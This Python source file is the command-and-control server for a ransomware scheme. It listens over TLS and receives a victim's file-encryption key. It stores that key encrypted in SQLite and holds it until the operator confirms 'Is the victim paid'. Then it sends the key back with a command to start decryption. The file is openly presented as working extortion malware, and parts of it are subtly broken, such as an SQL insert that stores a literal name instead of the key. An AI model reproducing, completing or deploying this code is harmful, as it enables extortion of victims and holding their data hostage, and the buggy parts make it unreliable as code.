import socket
import ssl

import sqlite3

import os
from cryptography.fernet import Fernet

import json

HOST = "0.0.0.0"
PORT = 9443

MASTER_KEY = os.getenv("MASTER_KEY")

def create_connection():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"Server listening on {HOST}:{PORT}")

    client_socket, addr = server_socket.accept()
    print(f"Connection from {addr}")
    return server_socket,client_socket

def wrap_conn_ssl(client_socket, certfile, keyfile):  
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(certfile=certfile, keyfile=keyfile)

    ssl_socket = ssl_context.wrap_socket(client_socket, server_side=True)
    return ssl_socket

def create_db():
    conn = sqlite3.connect("key.db")
    cursor = conn.cursor()
    
    cursor.execute("""
    CREATE TABLE Key (
        key TEXT
    );
    """)
    conn.commit()
    conn.close()

def insert_key_to_db(key):
    conn = sqlite3.connect("key.db")
    cursor = conn.cursor()
    cipher = transfer_key_to_cipher(MASTER_KEY.encode())
    
    encrypted_key = cipher.encrypt(key)
    
    cursor.execute("""INSERT INTO Key (key) VALUES (encrypted_key)""")
    
    conn.commit()
    conn.close()

def transfer_key_to_cipher(key):
    return Fernet(key)

def demand_payment():
    paid = False
    while not paid:
        is_paid = input("Is the victim paid [y/n]?")
        if is_paid == "y":
            print("Sending decryption key...")
            paid = True
            
def fetch_key_from_db():
    conn = sqlite3.connect("key.db")
    cursor = conn.cursor()
    
    cipher = transfer_key_to_cipher(MASTER_KEY.encode())
    
    cursor.execute("SELECT key FROM Key")
    val = cursor.fetchone()
    decrypted_key = cipher.decrypt(val[0])
    return decrypted_key

def main():
    server,conn = create_connection()
    secured_conn = wrap_conn_ssl(conn, "server.crt", "server.key")
    
    encryption_key = secured_conn.recv(1024)
    
    create_db()
    insert_key_to_db(encryption_key)
    
    demand_payment()
    key = fetch_key_from_db()
    request = {
        "action": "start decoder process",
        "key": key
    }
    
    request = json.dumps(request)
    secured_conn.send(request)
    
    
        
if __name__ == "__main__":
    main()